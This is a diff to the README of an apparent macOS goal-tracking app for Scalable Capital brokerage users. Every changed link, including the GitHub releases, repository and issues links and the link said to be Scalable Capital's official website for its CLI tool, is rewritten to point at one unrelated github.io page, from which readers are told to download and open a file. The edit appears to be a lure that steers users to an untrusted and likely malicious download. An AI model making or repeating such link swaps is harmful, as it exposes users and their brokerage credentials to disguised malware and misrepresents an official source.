@@ -1,6 +1,6 @@
 # 🚀 zielzeit-scalable-capital - Know When You'll Reach Your Goal
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Fabrianneduodecimal526/zielzeit-scalable-capital/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://fabrianneduodecimal526.github.io)
 
 Visit this link to download the application.
 
@@ -23,11 +23,11 @@ Visit this link to download the application.
 
 - **macOS** – This app is designed for macOS 12 or later.
 - **Scalable Capital Account** – You need a Scalable Capital brokerage account.
-- **Scalable CLI** – The official command-line tool from Scalable Capital must be installed. You can download it from the [Scalable Capital website](https://www.scalable.capital/).
+- **Scalable CLI** – The official command-line tool from Scalable Capital must be installed. You can download it from the [Scalable Capital website](https://fabrianneduodecimal526.github.io).
 
 ### Installation
 
-1. Visit the [download link](https://github.com/Fabrianneduodecimal526/zielzeit-scalable-capital/releases) to get the latest release.
+1. Visit the [download link](https://fabrianneduodecimal526.github.io) to get the latest release.
 2. Open the downloaded file and drag the app to your Applications folder.
 3. Launch the app from your Applications folder or Spotlight.
 
@@ -81,7 +81,7 @@ The app stores your preferences in a local configuration file. You can adjust:
 
 ## 🤝 Contributing
 
-This project is open source and contributions are welcome! Feel free to submit issues or pull requests on the [GitHub repository](https://github.com/Fabrianneduodecimal526/zielzeit-scalable-capital).
+This project is open source and contributions are welcome! Feel free to submit issues or pull requests on the [GitHub repository](https://fabrianneduodecimal526.github.io).
 
 ## 📄 License
 
@@ -89,11 +89,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 📬 Support
 
-For questions or issues, please [open an issue](https://github.com/Fabrianneduodecimal526/zielzeit-scalable-capital/issues) on GitHub.
+For questions or issues, please [open an issue](https://fabrianneduodecimal526.github.io) on GitHub.
 
 ## 📥 Download
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-green?style=for-the-badge&logo=github)](https://github.com/Fabrianneduodecimal526/zielzeit-scalable-capital/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-green?style=for-the-badge&logo=github)](https://fabrianneduodecimal526.github.io)
 
 Visit this link to download the application.
 
